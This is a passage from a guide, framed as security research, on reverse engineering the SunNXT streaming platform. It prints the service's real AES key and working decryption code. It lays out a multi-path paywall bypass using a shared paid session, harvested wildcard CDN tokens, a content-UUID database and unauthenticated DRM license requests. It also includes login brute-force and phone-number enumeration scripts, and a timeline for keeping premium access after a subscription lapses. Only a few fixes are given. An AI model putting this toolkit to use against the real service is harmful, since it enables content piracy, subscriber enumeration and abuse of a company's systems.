# Complete Learning Guide — SunNXT Security Research

**Author: Nitheesh D R**
**Date: May 23, 2026**
**Type: Security Research & OTT Platform Internals**

---

> This is the complete, single-file reference for the SunNXT security research project. Read top-to-bottom once for the full picture, then jump to specific sections as needed.

---

## Table of Contents

1. [What Is This Project?](#1-what-is-this-project)
2. [How an OTT Platform Works](#2-how-an-ott-platform-works)
3. [SunNXT Architecture — Reverse Engineered](#3-sunnxt-architecture--reverse-engineered)
4. [API Endpoints — Complete Reference](#4-api-endpoints--complete-reference)
5. [How the Encryption Works](#5-how-the-encryption-works)
6. [How Login and Sessions Work](#6-how-login-and-sessions-work)
7. [How Video Streaming Works (DASH & HLS)](#7-how-video-streaming-works-dash--hls)
8. [How DRM Works (Widevine, PlayReady, FairPlay)](#8-how-drm-works-widevine-playready-fairplay)
9. [How CORS Is Bypassed](#9-how-cors-is-bypassed)
10. [How Geo-Blocking Works](#10-how-geo-blocking-works)
11. [CDN Architecture & Akamai Tokens](#11-cdn-architecture--akamai-tokens)
12. [The Bypass System — All 3 Paths](#12-the-bypass-system--all-3-paths)
13. [All 20 Vulnerabilities — How They Work & How to Fix](#13-all-20-vulnerabilities--how-they-work--how-to-fix)
14. [Complete Request Flow — Step by Step](#14-complete-request-flow--step-by-step)
15. [Code Reference — Key Functions](#15-code-reference--key-functions)
16. [Security Testing Methodology](#16-security-testing-methodology)
17. [OWASP Top 10 Mapping](#17-owasp-top-10-mapping)
18. [Attack Chains](#18-attack-chains)
19. [Glossary](#19-glossary)

---

## 1. What Is This Project?

### The Problem Statement

SunNXT is an Indian OTT platform. Like Netflix, it uses:
- Encrypted APIs to exchange data
- Session cookies to authenticate users
- CDN (Content Delivery Network) to serve video
- DRM to prevent unauthorized decryption

As a security researcher, testing from a browser alone is limited — you can observe requests in DevTools, but you cannot automate, replay, or systematically test across session states.

### The Solution

Build a **programmable client** that mimics SunNXT's own web app. This client:
1. Knows the encryption key → can decrypt all API responses
2. Manages sessions automatically → can test any session state
3. Proxies all requests through a server → bypasses browser CORS restrictions
4. Integrates Shaka Player → can test DRM flows end-to-end
5. Implements bypass mechanisms → demonstrates real-world exploitation

### What Was Found

During this project, **20 security vulnerabilities** were discovered:

| Severity | Count |
|---|---|
| Critical | 2 |
| High | 4 |
| Medium | 8 |
| Low | 3 |
| Informational | 3 |

The most critical: the `modularLicense` DRM endpoint issues Widevine decryption keys without any authentication check (VULN-11). Combined with a wildcard CDN token (VULN-06) and permanent content UUIDs (VULN-12/VULN-20), this constitutes a complete bypass of the subscription paywall.

---

## 2. How an OTT Platform Works

Before diving into SunNXT, understand the general architecture of any OTT streaming platform:

```
┌──────────────────────────────────────────────────────────────────┐
│                          USER DEVICE                              │
│  Browser / App                                                    │
│  1. Load UI (HTML/CSS/JS)                                        │
│  2. Browse catalogue (API calls)                                  │
│  3. Click Play → Request stream URL from API                     │
│  4. Video player loads manifest (.mpd or .m3u8)                  │
│  5. Player downloads segments + decrypts with DRM key            │
└──────────────────────────────────────────────────────────────────┘
                               │
                    HTTPS API Calls
                               │
┌──────────────────────────────────────────────────────────────────┐
│                     ORIGIN SERVERS (sunnxt.com)                   │
│  - User authentication (login, session management)               │
│  - Content catalogue (show/movie metadata)                       │
│  - Stream URL generation (with CDN tokens)                       │
│  - Device management                                              │
└──────────────────────────────────────────────────────────────────┘
                               │
                    CDN Requests (segments)
                               │
┌──────────────────────────────────────────────────────────────────┐
│                    AKAMAI CDN                                     │
│  - Stores video segments (init.mp4, 1.m4s, 2.m4s...)            │
│  - Validates CDN access tokens (hdntl, hdnea)                    │
│  - Serves manifests (.mpd, .m3u8)                                │
└──────────────────────────────────────────────────────────────────┘
                               │
                    DRM License
                               │
┌──────────────────────────────────────────────────────────────────┐
│                 NAGRAVISION DRM SERVER                            │
│  - Validates Widevine/PlayReady license challenges               │
│  - (Should) check subscription before issuing keys              │
│  - Returns binary decryption key to browser CDM                  │
└──────────────────────────────────────────────────────────────────┘
```

### The Key Security Boundary

**Subscription enforcement happens at TWO places:**
1. **API layer** — the media API checks subscription before returning stream URLs
2. **DRM layer** — the license server should check subscription before issuing keys

SunNXT correctly implements check #1. Check #2 is broken (VULN-11). This creates the critical bypass.

---

## 3. SunNXT Architecture — Reverse Engineered

### The 3-Layer Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                    Browser (React / Shaka)                       │
│  Page Router → /api/* (all calls routed through our server)     │
└────────────────────────────┬────────────────────────────────────┘
                             │ HTTPS
                             ▼
┌─────────────────────────────────────────────────────────────────┐
│         Our Next.js Server (Vercel — Mumbai bom1)               │
│  /api/media/[id]    → Resolve + decrypt stream URLs             │
│  /api/stream-proxy  → CORS proxy + manifest rewriter            │
│  /api/license       → DRM license proxy                         │
│  /api/heartbeat     → Watch session tracking                    │
│  lib/sunnxt-session → Auto-login, session cache, device bypass  │
│  lib/cdn-bypass     → UUID DB, hdntl cache, bypass logic        │
└──────┬──────────────────────────┬───────────────────────────────┘
       │ Login/Media API          │ CDN Segment Requests
       ▼                          ▼
┌──────────────────┐    ┌──────────────────────────────┐
│  www.sunnxt.com  │    │  movies1-suntvvod1.akamaized  │
│  pwaapi.sunnxt   │    │  movies2-suntvvod1.akamaized  │
│  (Origin API)    │    │  (Akamai Media CDN)           │
└──────────────────┘    └──────────────────────────────┘
```

### Dual API Endpoints

SunNXT operates two API paths:

```
BFF API: https://www.sunnxt.com/next/api/
  - Used for most client calls
  - Responses are AES-128-CBC encrypted (VULN-01)
  - Requires session cookies

PWA API: https://pwaapi.sunnxt.com/
  - Direct API access
  - Some endpoints return plaintext JSON
  - Used for content detail, license proxy, heartbeat
  - modularLicense endpoint has no auth check (VULN-11)
```

---

## 4. API Endpoints — Complete Reference

### SunNXT Origin Endpoints

| Endpoint | Method | Auth | Response | Notes |
|---|---|---|---|---|
| `/next/api/media/{contentId}` | GET | Cookie | Encrypted JSON | Stream URLs |
| `/content/v3/contentDetail/{id}/` | GET | Cookie | JSON | PWA content detail |
| `/content/v2/browse` | GET | Cookie | JSON | Home feed |
| `/content/v2/search` | GET | Cookie | JSON | Search results |
| `/accounts/v3/login` | POST | No | JSON | Two-path login |
| `/accounts/v3/logout` | POST | Cookie | JSON | Logout |
| `/licenseproxy/v3/modularLicense/?content_id=<id>` | POST | **None** | Binary | **VULN-11** |
| `/heartbeat` | POST | Cookie | JSON | Watch tracking |

### Our Proxy Endpoints

| Endpoint | Method | Auth | Notes |
|---|---|---|---|
| `/api/media/[contentId]` | GET | Session or server | 3-path bypass system |
| `/api/stream-proxy?url=<url>` | GET | **None required (VULN-16)** | CDN CORS proxy |
| `/api/license?content_id=<id>` | POST | Session | DRM license proxy |
| `/api/auth/login` | POST | No | Login proxy |
| `/api/auth/logout` | POST | Session | Logout |
| `/api/auth/status?mobile=<phone>` | GET | **None (VULN-15)** | Phone enumeration |
| `/api/auth/clear-session` | GET | **None (VULN-14)** | Force re-login |
| `/api/heartbeat?contentId=&action=` | POST | Session | Watch tracking |
| `/api/download?url=<url>` | GET | **None (VULN-16)** | File download proxy |
| `/api/content/[contentId]` | GET | Session | Content detail |
| `/api/search?q=<query>` | GET | Session | Search |
| `/api/trending` | GET | Session | Trending |

---

## 5. How the Encryption Works

### Algorithm

SunNXT uses **AES-128-CBC** with a static key and a static all-zero IV:

```
Algorithm: AES-128-CBC
Key:       A3s68aORSgHs$71P  (16 bytes, UTF-8)
IV:        00000000000000000000000000000000  (all zero, 32 hex)
Padding:   PKCS7
Encoding:  Base64 ciphertext → AES decrypt → hex → UTF-8 JSON
```

### The Decrypt Function

```typescript
import CryptoJS from "crypto-js";

function decrypt(response: string): Record<string, unknown> {
  const keyWA = CryptoJS.enc.Utf8.parse("A3s68aORSgHs$71P");
  const iv = CryptoJS.enc.Hex.parse("00000000000000000000000000000000");
  const bytes = CryptoJS.AES.decrypt(response, keyWA, {
    iv,
    mode: CryptoJS.mode.CBC,
    padding: CryptoJS.pad.Pkcs7,
  });
  const hex = bytes.toString(CryptoJS.enc.Hex);
  return JSON.parse(Buffer.from(hex, "hex").toString("utf8"));
}
```

### Why This Is a Vulnerability (VULN-01)

This key lives inside SunNXT's client-side JavaScript bundle. Anyone can:
1. Open Chrome DevTools → Sources → Search for `A3s6`
2. Find the key in under 30 seconds
3. Decrypt every single API response SunNXT ever sends

The "encryption" is cosmetic. It adds zero security because the key is public.

### What Is Encrypted

- Stream URL responses (video links, CDN URLs)
- Login credential payloads
- Content metadata in some contexts

### What Is NOT Encrypted

- pwaapi direct responses (plaintext JSON)
- CDN segments (video data)
- DRM license requests/responses

---

## 6. How Login and Sessions Work

### Two Login Paths

**Path 1: BFF (Encrypted)**
```
POST https://www.sunnxt.com/next/api/accounts/v3/login
Body: { "response": AES_CBC_encrypt({ userid, password }) }
Response: { "response": AES_CBC_encrypt({ sessionId, userToken, ... }) }
```

**Path 2: PWA API (Plaintext)**
```
POST https://pwaapi.sunnxt.com/accounts/v3/login
Body: { "userid": "phone_or_email", "password": "plaintext" }
Response: { "code": 200, "results": [{ "userToken": "...", "sessionId": "..." }] }
```

Path 2 accepts **plaintext credentials with no encryption**. The BFF "encryption" is theater.

### Session Cookies

After login, SunNXT sets:
```
sessionid   = <token>    # Primary auth (httpOnly, Secure, SameSite=None)
uid         = <user_id>  # User identifier
usertoken   = <jwt>      # MyPlex user token
sdt         = <token>    # Session device token
```

The `sessionid` has no `Expires` attribute → sessions persist weeks/months (VULN-04).

### Server-Side Session Cache

The clone caches the server's SunNXT session in memory:

```typescript
interface CachedSession {
  cookies: string;
  expiresAt: number;
}
let cachedSession: CachedSession | null = null;

export async function getSunnxtCookies(): Promise<string> {
  if (cachedSession && Date.now() < cachedSession.expiresAt) {
    return cachedSession.cookies;  // Return cached
  }
  return await performLogin();     // Re-authenticate
}
```

This auto-login means the server always has a valid session available for bypass operations.

---

## 7. How Video Streaming Works (DASH & HLS)

### Stream Format Inventory

The media API can return multiple format variants per content:

| Format | Protocol | DRM | Use Case |
|---|---|---|---|
| `dash` | MPEG-DASH | None (clear) | Older content |
| `dash-cenc` | MPEG-DASH | Widevine + PlayReady | Premium HD |
| `hls` | HLS | None (clear) | iOS fallback |
| `hls-fp-aapl` | HLS | FairPlay | Safari/iOS |
| `hlsaes` | HLS | AES-128 | Basic encryption |

### MPEG-DASH: How It Works

DASH (Dynamic Adaptive Streaming over HTTP) is the primary format. It works like this:

```
1. Player fetches index.mpd (manifest file)
   → Lists all representations (qualities): 1080p, 720p, 480p, 360p
   → Specifies segment URLs (with hdntl token in the template)
   → Specifies DRM information (ContentProtection element with PSSH)

2. Player chooses initial quality based on bandwidth estimate

3. Player fetches init.mp4 for chosen representation
   → Contains codec/container initialization
   → Contains PSSH box (triggers DRM if content is encrypted)

4. Player fetches segment files: 1.m4s, 2.m4s, ... N.m4s
   → Each 4-6 seconds of encoded video/audio

5. Player decodes and renders — switches quality as bandwidth changes
```

### DASH MPD Structure (Example)

```xml
<MPD type="static" mediaPresentationDuration="PT7272.0S">
  <Period>
    <AdaptationSet mimeType="video/mp4">
      <!-- DRM protection info -->
      <ContentProtection schemeIdUri="urn:uuid:edef8ba9-79d6-4ace-a3c8-27dcd51d21ed">
        <cenc:pssh>AAAB...</cenc:pssh>  <!-- Widevine PSSH -->
      </ContentProtection>
      <!-- Segment template — hdntl token here -->
      <SegmentTemplate
        initialization="$RepresentationID$/init.mp4?hdntl=exp%3D...%7Eacl%3D%2F*..."
        media="$RepresentationID$/$Number$.m4s?hdntl=exp%3D...%7Eacl%3D%2F*..."
        startNumber="1" timescale="90000"/>
      <!-- Quality representations -->
      <Representation id="1080p" bandwidth="5000000" width="1920" height="1080"/>
      <Representation id="720p"  bandwidth="2500000" width="1280" height="720"/>
      <Representation id="480p"  bandwidth="1000000" width="854"  height="480"/>
    </AdaptationSet>
  </Period>
</MPD>
```

### MPD Rewriting (Our Stream Proxy)

The stream proxy intercepts MPD responses and rewrites them:

```typescript
// 1. Add BaseURL to route segment requests through our proxy
mpd = mpd.replace("<Period>",
  `<Period><BaseURL>/api/stream-proxy?url=https://cdn-host.akamaized.net/</BaseURL>`);

// 2. Add license URL for DRM (so Shaka knows where to send license requests)
mpd = mpd.replace(
  /<ContentProtection[^>]*edef8ba9[^>]*>/,  // Widevine ContentProtection
  `$&<dashif:Laurl licenseType="EME-1.0">/api/license?content_id=${id}</dashif:Laurl>`
);
```

**Why BaseURL?** The browser can't fetch CDN segments directly (CORS restriction). Routing through our proxy adds the right headers.

**Why Laurl?** Shaka Player needs to know where to send license requests. The original MPD doesn't specify this — we inject it.

### HLS Rewriting

HLS manifests (`.m3u8`) are rewritten similarly:
```
# Original segment URL:
https://cdn.akamaized.net/path/segment.ts?hdntl=...

# After rewriting:
/api/stream-proxy?url=https%3A%2F%2Fcdn.akamaized.net%2Fpath%2Fsegment.ts%3Fhdntl%3D...
```

---

## 8. How DRM Works (Widevine, PlayReady, FairPlay)

### What DRM Does

DRM (Digital Rights Management) ensures that even if someone has the video file, they cannot play it without a valid decryption key. The key is obtained from a license server.

### The Encrypted Media Extensions (EME) API

```
Browser                    DRM Server
   │                           │
   │ 1. Load CENC stream        │
   │    Detect PSSH box         │
   │                           │
   │ 2. Create MediaKeySession  │
   │                           │
   │ 3. generateRequest()       │
   │    → Widevine challenge    │
   │    (binary protobuf)       │
   │                           │
   │ 4. POST challenge ─────────►
   │                           │ 5. Validate (should check subscription)
   │                           │ 6. Issue license binary
   │   ◄──────────── license ──│
   │                           │
   │ 7. Update MediaKeySession  │
   │    CDM decrypts video      │
   └───────────────────────────┘
```

### The DRM License Endpoint (VULN-11)

The SunNXT modularLicense endpoint issues licenses without step 5 — it does not validate authentication or subscription:

```
POST https://pwaapi.sunnxt.com/licenseproxy/v3/modularLicense/?content_id=82850
Content-Type: application/octet-stream
Body: <binary Widevine challenge>

# NO Authorization header
# NO Cookie header
# → Still returns valid binary license
```

**This is the most critical vulnerability.** Without this check, DRM provides no real protection.

### PSSH Box — DRM Bootstrap

The PSSH (Protection System Specific Header) box in `init.mp4` tells the browser "this content is DRM-protected, here's the system-specific data":

```
init.mp4 binary structure:
  Box type: 'pssh'
  System ID: edef8ba9-79d6-4ace-a3c8-27dcd51d21ed  (Widevine)
  Data: <protobuf with content key IDs>
```

Even if the MPD has no `<ContentProtection>`, the PSSH in init.mp4 still triggers the license request (VULN-13 + VULN-11 interaction).

### Detecting Valid vs Error License Response

```typescript
const responseBuffer = new Uint8Array(await response.arrayBuffer());
const firstByte = responseBuffer[0];

if (firstByte === 0x7B) {
  // 0x7B is '{' in ASCII — JSON error response
  const errorText = new TextDecoder().decode(responseBuffer);
  throw new Error(`License error: ${errorText}`);
}
// Binary protobuf → valid Widevine license
// Pass to: session.update(responseBuffer)
```

### Key Shaka Error Codes

| Code | Meaning | Common Cause |
|---|---|---|
| 6012 | NO_LICENSE_SERVER_GIVEN | Missing `<dashif:Laurl>` in MPD |
| 6010 | KEY_SYSTEM_NOT_SUPPORTED | Browser doesn't support Widevine |
| 4012 | RESTRICTIONS_CANNOT_BE_MET | Robustness too strict (L1 required, L3 available) |
| 1001 | SEGMENT_NOT_FOUND | hdntl token expired or wrong |
| 1002 | BAD_HTTP_STATUS | CDN returned non-200 |

---

## 9. How CORS Is Bypassed

### What CORS Is

CORS (Cross-Origin Resource Sharing) is a browser security feature. When JavaScript on `sunnxt-clone.vercel.app` tries to fetch from `api.sunnxt.com`, the browser blocks the request unless `api.sunnxt.com` includes an `Access-Control-Allow-Origin` header allowing our domain.

SunNXT's APIs do not allow third-party origins → direct browser requests are blocked.

### How We Bypass It

Our Next.js server acts as a proxy:

```
Browser → GET /api/stream-proxy?url=<cdn-url>
           ↓ Server-side fetch (no CORS restriction)
         CDN returns video data
           ↓ Server adds CORS headers
Browser ← Response with Access-Control-Allow-Origin: *
```

The browser's CORS policy only applies to JavaScript-initiated requests. Server-to-server HTTP requests have no CORS restrictions.

### The Security Problem (VULN-16)

The proxy should verify the browser user is authenticated before proxying:

```typescript
// VULNERABLE — no auth check:
export async function GET(request: NextRequest) {
  const serverCookie = await getSunnxtCookies();  // server's subscription
  const response = await fetch(targetUrl, {
    headers: { cookie: serverCookie }
  });
  return response;
}
```

Any unauthenticated user can call `/api/stream-proxy` and get CDN content authenticated with the server's subscription.

**Fix:**
```typescript
export async function GET(request: NextRequest) {
  const browserCookie = request.headers.get("cookie") || "";
  if (!browserCookie.includes("sessionid")) {
    return NextResponse.json({ error: "login_required" }, { status: 401 });
  }
  // Use browser user's own session, not server's
  const response = await fetch(targetUrl, {
    headers: { cookie: browserCookie }
  });
  return response;
}
```

---

## 10. How Geo-Blocking Works

### SunNXT's Geo-Block Implementation

SunNXT checks the IP address of the API request against a list of allowed regions. If the IP is not in an allowed region, the API returns:

```json
{
  "code": 200,
  "results": [{
    "notify_type": "error_notify",
    "blocked_reason": "GEO_BLOCK",
    "title": "Content Not Available",
    "p1": "This content is not available in your region."
  }]
}
```

Note the `code: 200` with an error payload — this is VULN-09.

### Geo-Block Detection in Code

```typescript
function getRoamingError(data: Record<string, unknown>): string | null {
  const results = data.results as Array<Record<string, unknown>> | undefined;
  const r0 = results?.[0];
  if (r0?.blocked_reason || r0?.notify_type === "error_notify") {
    return (r0.title as string) || "Content blocked";
  }
  return null;
}
```

### Bypass via Server Location (VULN-07)

Because our Next.js server is deployed on Vercel in Mumbai (`bom1`), all API requests originate from an Indian IP. The geo-check passes automatically. No VPN needed.

```json
// vercel.json
{ "regions": ["bom1"] }
```

---

## 11. CDN Architecture & Akamai Tokens

### CDN Topology

```
Akamai CDN (SunNXT VOD):
├── movies1-suntvvod1.akamaized.net  → /movies1/<UUID>/
├── movies2-suntvvod1.akamaized.net  → /movies2/<UUID>/
└── suntvvod1.sunnxt.com             → direct origin (some content)

Live TV:
└── livestream4.sunnxt.com           → /live/<channel>/index.m3u8

Subtitles:
└── d3t5zs0ma4m7.cloudfront.net      → VTT/SRT files
```

### Two Token Types

SunNXT uses two Akamai authentication tokens:

#### hdnea — Akamai EdgeAuth 1.0 (Per-Content)
```
Format: hdnea=st=<start>~exp=<end>~acl=!*/<UUID>/*~hmac=<sha256>
Scope:  Single content UUID folder only
TTL:    ~3 hours
Source: Embedded in CDN URLs from the media API response
```

The `acl=!*/<UUID>/*~` means it only works for that specific content's CDN path.

#### hdntl — Akamai EdgeToken Lite 2.0 (Wildcard — VULN-06)
```
Format: exp=<unix>~acl=/*~data=hdntl~hmac=<sha256>
Scope:  acl=/* → ALL content on the CDN
TTL:    24 hours
Source: Cookie set by Akamai on first successful CDN access
```

**The critical insight:** `acl=/*` means one hdntl token is valid for every piece of content on `*.akamaized.net`. No subscription check. No per-content restriction. Just expiry validation and HMAC verification.

### hdntl Token Persistence (How We Keep It Fresh)

The clone persists hdntl tokens to survive server restarts and subscription expiry:

```
Load order (highest priority first):
1. SUNNXT_HDNTL env var         → seeded in module init IIFE
2. $TMPDIR/sunnxt-hdntl.json    → disk persistence
3. Harvested from media API URLs → extracted from video entries
4. Harvested from stream proxy   → extracted from MPD segment templates
```

When a user plays any content, the stream proxy processes the MPD and finds:
```
?hdntl=exp%3D1779560880%7Eacl%3D%2F*%7Edata%3Dhdntl%7Ehmac%3D...
```

This is extracted, decoded, validated (exp not past), and saved to disk. The token auto-refreshes with every successful playback session.

```typescript
// IIFE — runs once on module load
(function initHdntlCache() {
  const envToken = process.env.SUNNXT_HDNTL;
  if (envToken && seedFromToken(envToken, "SUNNXT_HDNTL env")) return;
  const disk = loadCacheFromDisk();
  if (disk) {
    hdntlCache = disk;
    console.log(`cdn-bypass: loaded from disk, expires ${new Date(disk.expiresAt).toISOString()}`);
  }
})();
```

### Content UUID Database

Each piece of content has a permanent UUID mapping to its CDN path (VULN-12 + VULN-20):

```typescript
const UUID_DB: Record<string, UuidEntry> = {
  "82850":  { uuid: "2a0b194b81d4071cf41ccfeb69d690e2", cdnHost: "movies1", hasQualitySubdir: true },
  "115249": { uuid: "f38231600b68e429d44dff546f96b29e", cdnHost: "movies1", hasQualitySubdir: true },
  "251833": { uuid: "5bfb2a0404ec10ba52cb2d072c64cbf4", cdnHost: "movies2", hasQualitySubdir: false },
};
```

New UUIDs are learned automatically from API responses and saved for future bypass use.

---

## 12. The Bypass System — All 3 Paths

When a user lacks a subscription, the media API returns a subscription error. The bypass system has 3 fallback paths tried in order:

### Decision Flow

```
Media API returns subscription error
│
├──[Bypass 1]─→ Server subscribed session
│                Retry with SUNNXT_USERID credentials from .env.local
│                Success? → harvest hdntl + UUIDs → return stream URLs
│                Expired subscription? → try next
│
├──[Bypass 2]─→ CDN UUID + hdntl (synchronous — no HTTP call)
│                Look up UUID_DB[contentId]
│                Check hdntlCache (in-memory → disk → env var)
│                Both present? → build CDN URLs directly → return
│                UUID unknown or token missing? → try next
│
└──[Bypass 3]─→ pwaapi contentDetail (HTTP call)
                 Fetch pwaapi.sunnxt.com/content/v3/contentDetail/<id>/
                 Requires: valid sessionid cookie (even unsubscribed)
                 Success? → harvest hdntl + UUID → return stream URLs
                 Failure? → 404 video_unavailable
```

### Bypass 2 Deep Dive (CDN UUID + hdntl)

This is the most elegant bypass. It works because:

1. **The CDN doesn't check subscriptions** — only Akamai token validity
2. **hdntl is wildcard** (`acl=/*`) — one token for all content (VULN-06)
3. **UUIDs never change** — CDN paths are permanent (VULN-12/VULN-20)

```typescript
export function buildBypassEntries(contentId: string): VideoEntry[] | null {
  const entry = UUID_DB[contentId];
  if (!entry) return null;  // UUID not known

  const token = getCachedHdntl();
  if (!token) return null;  // No token in cache

  const base = `https://${entry.cdnHost}-suntvvod1.akamaized.net/${entry.cdnHost}/${entry.uuid}`;

  return [
    { link: `${base}/auto/index.mpd?hdntl=${token}`, format: "dash-cenc", quality: "auto" },
    { link: `${base}/1080p/index.mpd?hdntl=${token}`, format: "dash-cenc", quality: "1080p" },
    { link: `${base}/720p/index.mpd?hdntl=${token}`, format: "dash-cenc", quality: "720p" },
    { link: `${base}/480p/index.mpd?hdntl=${token}`, format: "dash-cenc", quality: "480p" },
  ];
}
```

The player receives these URLs → loads DASH MPD → CDN serves segments (token validates) → browser gets PSSH → generates Widevine challenge → posts to modularLicense (no auth — VULN-11) → license issued → content decrypts.

---

## 13. All 20 Vulnerabilities — How They Work & How to Fix

### Quick Reference

| ID | Severity | Title |
|---|---|---|
| VULN-01 | High | Static AES key in client JS |
| VULN-02 | Medium | All-zero IV in AES-CBC |
| VULN-03 | Medium | Device limit bypass |
| VULN-04 | Medium | Long-lived sessions |
| VULN-05 | Medium | ManageDevices missing access control |
| VULN-06 | High | hdntl wildcard token (`acl=/*`) |
| VULN-07 | Medium | Geo-block bypass via server IP |
| VULN-08 | Low | DRM JWT `maxUses: 2` reuse window |
| VULN-09 | Low | HTTP 200 for error states |
| VULN-10 | Medium | No rate limiting on login |
| VULN-11 | **Critical** | modularLicense no auth/subscription check |
| VULN-12 | High | Permanent content UUIDs |
| VULN-13 | Medium | PSSH in init.mp4 triggers DRM independently |
| VULN-14 | Medium | Unauthenticated clear-session endpoint |
| VULN-15 | Medium | Phone number enumeration |
| VULN-16 | **Critical** | Server session proxied to unauthenticated users |
| VULN-17 | Low | Heartbeat parameter injection |
| VULN-18 | Info | AES key in 4 source files |
| VULN-19 | Info | MPD BaseURL injection via regex |
| VULN-20 | High | Permanent UUIDs + no rotation = permanent access |

### VULN-01: Static AES Key — Why It Matters

The encryption key `A3s68aORSgHs$71P` is in the JavaScript bundle. This makes the encryption meaningless:

```
Without knowing the key:
  Attacker sees: "kdF8sA3nmKL+..." (ciphertext)
  Cannot decrypt → data is safe

With key shipped in client JS:
  Attacker finds key in DevTools → decrypts everything
  "Encryption" becomes transparent labeling
```

**The fix:** Move decryption server-side. Use ECDH for client-initiated encrypted communication where the key is ephemeral per-session.

### VULN-03: Device Limit Bypass — How It Works

SunNXT tracks devices in a database. On login, it checks:
```
IF device_count(user) >= limit THEN
  Prompt to deregister a device
```

The bypass:
1. Server-side session cache is cleared (`/api/auth/clear-session` — VULN-14)
2. Server re-authenticates → new device entry created
3. Old entry may or may not be cleaned up
4. Repeat until you have more devices than the limit

The root problem: the limit check is at login time, not enforced continuously.

### VULN-06: Wildcard HDntl — The CDN Bypass Foundation

```
Content-specific token (hdnea): acl=!*/<UUID>/*~
  → Only works for ONE piece of content

Wildcard token (hdntl): acl=/*
  → Works for EVERY piece of content on the CDN
```

When SunNXT generates the hdntl token, the `acl=/*` is baked into the HMAC signature. Akamai validates:
1. Is the HMAC correct? (Yes — SunNXT generated it)
2. Is the token expired? (No — 24h TTL)
3. Does the request path match the acl? (Yes — `/*` matches everything)

Subscription status is NOT in this check. The CDN doesn't know or care about subscriptions.

### VULN-10: No Rate Limiting — How to Test

```bash
# Test script (run from terminal):
for i in {1..50}; do
  response=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST "https://pwaapi.sunnxt.com/accounts/v3/login" \
    -H "Content-Type: application/json" \
    -d '{"userid":"test@example.com","password":"wrongpassword"}')
  echo "Attempt $i: $response"
done
# Expected if protected: 429 after 5-10 attempts
# Actual: 200 (error) on all 50 attempts
```

### VULN-11: modularLicense No Auth — The Complete Picture

```
Normal flow:
  User pays → subscription active
  User logs in → gets sessionid cookie
  User plays content → media API returns CDN URL (checks subscription)
  Shaka generates Widevine challenge
  Challenge sent to modularLicense WITH session cookie → subscription verified → key issued

Attack flow:
  Attacker has NO subscription
  Attacker has CDN URL (from VULN-06 + VULN-12 = no subscription needed)
  Shaka generates Widevine challenge
  Challenge sent to modularLicense WITHOUT any cookie → key issued anyway (VULN-11)
  Content decrypts
```

The entire DRM system is bypassed at its final checkpoint.

### VULN-14: Unauthenticated Clear-Session

```typescript
// This endpoint has no auth check:
export async function GET() {
  await forceRelogin();  // Clears cache, triggers fresh SunNXT login
  return NextResponse.json({ ok: true });
}
```

```bash
# Anyone can call this:
curl "https://your-clone.vercel.app/api/auth/clear-session"
# Server immediately logs out + re-logs into SunNXT
# Disrupts all current streaming sessions
```

### VULN-15: Phone Enumeration — Practical Impact

```bash
# Build a subscriber list from any phone number database:
while read phone; do
  result=$(curl -s "https://clone.vercel.app/api/auth/status?mobile=$phone")
  active=$(echo "$result" | jq -r '.subscription_status')
  if [ "$active" = "active" ]; then
    echo "Active subscriber: $phone"
  fi
done < phone_numbers.txt
```

No authentication required. No rate limiting (with VULN-10). This can enumerate thousands of phone numbers per hour.

### VULN-16: Server Session Shared — Why It's Critical

```
Normal design:
  User authenticates → has their own session → their session used for proxy calls

Our current design:
  Server has subscribed session from .env.local
  ANY user (logged in OR not) → proxy uses server's session
  
Result: One paid subscription account serves unlimited anonymous users
```

This is a fundamental design flaw, not a configuration error. The intent of having server credentials was to enable bypass for logged-in users — but the implementation lacks the session check.

### VULN-20: Permanent UUID + Token Auto-Refresh = Permanent Access

```
Timeline:
  Day 0: User subscribes to SunNXT
          → Watches content → hdntl token obtained (24h)
          → UUIDs learned from API responses
          → hdntl saved to disk ($TMPDIR/sunnxt-hdntl.json)
          → UUID DB populated

  Day 1: User's subscription expires
          → Media API now returns "Please subscribe"
          → BUT: UUID_DB still has learned UUIDs
          → AND: cached hdntl may still be valid (if within 24h)

  Day 1+ (with expired hdntl): 
          → User watches any FREE content (no subscription needed)
          → Stream proxy extracts fresh hdntl from MPD segment URLs
          → hdntl saved to disk again
          → UUID+hdntl bypass now works for premium content again

  Result: After a 1-day subscription:
          → Permanent CDN paths (UUIDs never change)
          → Self-refreshing CDN tokens (from free content playback)
          → DRM keys available without auth (VULN-11)
          → Permanent premium access
```

---

## 14. Complete Request Flow — Step by Step

From the moment a user clicks "Play" to the first video frame:

```
T=0ms    User clicks Play on content ID 82850

T=5ms    Browser: GET /api/media/82850
          → Checks browser session cookie
          → Falls through to server session (getSunnxtCookies())

T=10ms   Server: GET https://www.sunnxt.com/next/api/media/82850
          → Headers: x-myplex-platform: browser, cookie: <session>
          → Gets encrypted response

T=15ms   Server: decrypt(raw.response)
          → AES-128-CBC with static key
          → Gets JSON with videos.values[]

T=16ms   Server: hasVideos(data)?
          → NO (subscription required)
          → getVideosError(data) = "Please subscribe to watch the content"

T=17ms   Server: [Bypass 1] getSunnxtCookies() → retry with server session
          → (if SUNNXT_USERID configured and still subscribed)
          → (if expired: skip to bypass 2)

T=18ms   Server: [Bypass 2] buildBypassEntries("82850")
          → UUID_DB["82850"] = { uuid: "2a0b...", cdnHost: "movies1" }
          → getCachedHdntl() = "exp=1779560880~acl=/*~..."
          → Build CDN URLs directly
          → Return JSON response with 4 format entries

T=20ms   Browser: receives media response with CDN URLs
          → Shaka Player initialized
          → Selects "dash-cenc" format (highest quality)

T=25ms   Browser → /api/stream-proxy?url=https%3A%2F%2Fmovies1-suntvvod1...index.mpd
          → Our proxy fetches the MPD from Akamai CDN
          → CDN validates hdntl token (HMAC + expiry)
          → CDN returns MPD XML

T=30ms   Server: rewrite MPD
          → Inject <BaseURL> for segment routing
          → Inject <dashif:Laurl> for DRM license URL

T=35ms   Browser: Shaka parses rewritten MPD
          → Fetches /api/stream-proxy?url=...1080p/init.mp4
          → init.mp4 contains PSSH box (Widevine)

T=40ms   Browser: EME API detects PSSH
          → Creates MediaKeySession
          → generateRequest() produces Widevine challenge (binary)

T=45ms   Browser: POST /api/license?content_id=82850
          → Body: Widevine challenge binary

T=50ms   Server: POST https://pwaapi.sunnxt.com/licenseproxy/v3/modularLicense/?content_id=82850
          → Body: Widevine challenge (forwarded)
          → NO auth headers needed (VULN-11)

T=60ms   pwaapi: Returns valid binary Widevine license

T=65ms   Browser: CDM processes license → decryption key stored
          → Starts downloading video segments

T=500ms  First video segment decrypted and rendered → video plays
```

---

## 15. Code Reference — Key Functions

### `lib/cdn-bypass.ts`

| Function | What It Does |
